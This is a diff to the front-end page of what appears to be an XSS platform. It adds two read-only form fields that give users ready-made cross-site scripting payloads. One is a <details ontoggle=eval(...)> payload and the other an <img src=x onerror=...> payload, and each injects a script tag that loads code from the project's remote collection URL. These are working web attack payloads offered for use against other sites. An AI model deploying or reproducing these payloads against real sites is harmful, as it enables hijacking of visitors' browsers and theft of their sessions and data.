@@ -504,6 +504,20 @@ export default function ProjectPage() {
                                     disabled={true}
                                 />
                                 <ProFormText
+                                    name="projecturl_script"
+                                    label="常规<details>标签代码"
+                                    // readonly={true}
+                                    initialValue={"<details open ontoggle=eval(“appendChild(createElement(‘script’)).src=’http://"+ row.projecturl + "'”) >"}
+                                    disabled={true}
+                                />
+                                <ProFormText
+                                    name="projecturl_script"
+                                    label="常规<img>标签代码"
+                                    // readonly={true}
+                                    initialValue={"<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='https://" + row.projecturl + "';>"}
+                                    disabled={true}
+                                />
+                                <ProFormText
                                     name="projecturl_img"
                                     label="图片探测代码"
                                     tooltip="图片探测请在URL后添加.png/.jpg/.gif后缀名"
